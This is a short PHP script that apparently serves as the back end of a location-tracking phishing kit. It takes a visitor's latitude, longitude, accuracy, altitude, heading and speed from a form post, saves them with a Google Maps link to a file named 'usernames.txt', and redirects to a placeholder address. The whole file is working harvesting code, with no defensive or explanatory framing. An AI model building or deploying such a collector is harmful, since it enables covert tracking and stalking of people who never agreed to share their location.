<?php
header('Content-Type: text/html');
{
  $lat = $_POST['Lat'];
  $lon = $_POST['Lon'];
  $acc = $_POST['Acc'];
  $alt = $_POST['Alt'];
  $dir = $_POST['Dir'];
  $spd = $_POST['Spd'];

  $linkdata = ("--------------------------------------"."\r\n"."\r\n"."Google Map Link:: https://www.google.com/maps/place/".$lat."+".$lon."\r\n"."\r\n");
  $data = (
    'Latitude = '.$lat."\r\n".
    'Longitude = '.$lon."\r\n".
    'Accuracy(meter) = '.$acc."\r\n".
    'Altitude = '.$alt."\r\n".
    'Direction(moving) = '.$dir."\r\n".
    'Speed(moving)= '.$spd."\r\n"."--------------------------------------");
  $f = fopen('usernames.txt', 'w+');
  fwrite($f, $linkdata);
  fwrite($f, $data);
  fclose($f);
}
header('Location: <CUSTOM>');
?>
